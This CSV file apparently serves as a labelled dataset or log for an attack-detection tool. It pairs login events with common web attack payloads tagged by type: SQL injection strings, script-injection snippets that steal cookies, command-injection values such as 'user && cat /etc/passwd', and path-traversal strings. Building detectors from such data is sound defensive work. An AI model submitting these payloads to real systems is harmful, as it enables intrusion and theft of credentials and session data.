payload,attack_type,timestamp
1,Failed Login,2026-01-25 10:04:11.111559
admin,Successful Login,2026-01-25 10:09:33.248743
1 OR | 1`,CommandInjection,2026-01-30 12:11:38.628905
' OR 1=1 --,SQLi,2025-12-30 21:15:10.723808
admin' OR '1'='1,SQLi,2026-01-05 01:15:10.724001
' UNION SELECT NULL--,SQLi,2026-01-19 06:15:10.724074
admin'--,SQLi,2026-01-14 05:15:10.724125
' OR 'x'='x,SQLi,2026-01-21 06:15:10.724173
<script>alert('XSS')</script>,XSS,2026-01-02 07:15:10.724214
<img src=x onerror=alert(1)>,XSS,2026-01-21 10:15:10.724254
admin<script>alert(document.cookie)</script>,XSS,2026-01-05 03:15:10.724298
admin; ls -la,CommandInjection,2026-01-17 14:15:10.724349
user && cat /etc/passwd,CommandInjection,2026-01-29 11:15:10.724389
test | whoami,CommandInjection,2026-01-22 08:15:10.724426
../../../etc/passwd,PathTraversal,2026-01-06 02:15:10.724462
..\..\..\windows\system32,PathTraversal,2026-01-21 01:15:10.724499
xK9#mL@pQ2$vN8&wR5*tY1,Anomaly,2026-01-25 01:15:10.724535
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,Anomaly,2026-01-23 14:15:10.724569
<img src=x onerror=alert(1)>,XSS,2026-01-30 12:52:42.500687
<img src=x onerror=alert(1)>,XSS,2026-01-30 12:55:19.755668
<img src=x onerror=alert(1)>,XSS,2026-01-30 12:55:19.879770
main,Successful Login,2026-01-30 12:59:49.931695
main,Failed Login,2026-01-30 13:00:00.614572
main,Failed Login,2026-01-30 13:00:04.047262
main,Failed Login,2026-01-30 13:00:05.808775
' OR 1=1 --,SQLi,2026-01-16 17:37:59.837015
admin' OR '1'='1,SQLi,2026-01-02 05:37:59.837137
' UNION SELECT NULL--,SQLi,2026-01-01 23:37:59.837196
admin'--,SQLi,2026-01-19 15:37:59.837247
' OR 'x'='x,SQLi,2026-01-28 08:37:59.837295
<script>alert('XSS')</script>,XSS,2026-01-25 01:37:59.837336
<img src=x onerror=alert(1)>,XSS,2026-01-17 16:37:59.837376
admin<script>alert(document.cookie)</script>,XSS,2026-01-09 21:37:59.837418
admin; ls -la,CommandInjection,2026-01-06 15:37:59.837470
